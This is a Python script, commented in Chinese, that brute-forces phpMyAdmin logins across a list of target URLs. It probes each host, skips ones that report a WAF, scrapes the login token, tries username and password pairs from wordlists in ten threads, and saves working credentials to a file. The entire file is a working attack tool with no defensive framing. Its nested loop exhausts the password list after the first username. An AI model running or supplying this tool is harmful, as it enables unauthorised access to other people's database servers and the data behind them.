#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# 方式一：发送post请求，获取响应
import html
from concurrent.futures.thread import ThreadPoolExecutor
import requests
import time
import urllib3
import re

userdic = 'user.txt'
passdic = 'password.txt'
urldic = 'urls.txt'
urllib3.disable_warnings()  # 禁用https安全警告


def test_url(url):  # 测试url是否可以访问
    print("正在尝试连接\t" + url)
    try:
        response = requests.get(url=url, verify=False)
        time.sleep(1)
        header = response.headers
        html = response.content.decode('utf-8')
        if 'X-Powered-By' in header.keys():  # 响应头X-Powered-By参数中如果有"WAF"字符串，说明存在waf，停止爆破
            if 'WAF' in header['X-Powered-By'] or 'waf' in header['X-Powered-By']:
                print("存在WAF: " + header['X-Powered-By'])
                return "WAF"
        if "phpMyAdmin" in html:
            print("成功")
            return "Success"
        else:
            print("失败")
            return "Fail"
    except Exception as e:
        print(e)
        print("失败")
        return "Fail"


def get_token(text):  # 获取token
    token_list = re.findall("name=\"token\" value=\"(.*?)\"", text, re.I | re.M)
    return html.unescape(token_list[0])


def try_login(ss, target, user, pwd, token):  # 尝试登陆
    """
    :param ss: session
    :param target: 目标网站
    :param user: 用户名
    :param pwd: 密码
    :param token: token
    :return: 响应对象
    """
    data = {'pma_username': user,
            'pma_password': pwd,
            'server': 1,
            'token': token}
    response = ss.post(url=target, verify=False, data=data)
    time.sleep(2)
    return response


def bf(url):  # 爆破模块
    ss = requests.session()
    ss.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate'
    }
    try:
        # 获取token
        response = ss.get(url, verify=False)
        if response.status_code == 403:
            print("403")
            return
        html1 = response.content.decode('utf-8')
        token = get_token(html1)

        # 尝试爆破
        with open(userdic, 'r', encoding='utf-8')as f1, open(passdic, 'r', encoding='utf-8') as f2:
            for user in f1:
                for pwd in f2:
                    user = user.strip()
                    pwd = pwd.strip()
                    print(f'尝试登陆  {url}  {user}  {pwd}  ')
                    try_login(ss, url, user, pwd, token)
                    new_url = url + "index.php?token=" + token
                    html2 = ss.get(new_url, verify=False).content.decode('utf-8')
                    if "login" not in html2:
                        print(f'登陆成功  {url}  {user}  {pwd}')
                        with open('recheck.txt', 'a', encoding='utf-8') as f3:
                            f3.write(f'{url}  |  {user}  |  {pwd}\n')
                        return True
                    else:
                        print(f'登陆失败  {url}  {user}  {pwd}')
    except Exception as e:
        print(e)
    finally:
        ss.close()


pool = ThreadPoolExecutor(max_workers=10)  # 设置线程池大小

if __name__ == "__main__":
    urls_success = []
    urls_fail = []
    urls_waf = []

    with open(urldic) as f:
        for url in f:
            url = url.strip()
            testResult = test_url(url)
            if testResult == "Success":
                urls_success.append(url)
            elif testResult == "WAF":
                urls_waf.append(url)
            else:
                urls_fail.append(url)
        print("\n存在WAF的URL：")
        print('\n'.join(urls_waf))
        print("尝试连接成功的URL：")
        print('\n'.join(urls_success))
        print("\n尝试连接失败的URL：")
        print('\n'.join(urls_fail))

        print("press any key to continue, but 'q' to quit")
        if input() == "q":
            quit()
        print("正在准备爆破...")

        with open("fail.txt", "a", encoding='utf-8') as f1:
            for i in urls_fail:
                f1.write(i + "\n")
        with open("waf.txt", "a", encoding='utf-8') as f2:
            for i in urls_waf:
                f2.write(i + "\n")

    try:
        for target in urls_success:
            pool.submit(bf, target)  # 分配线程
    except Exception as e:
        print(e)
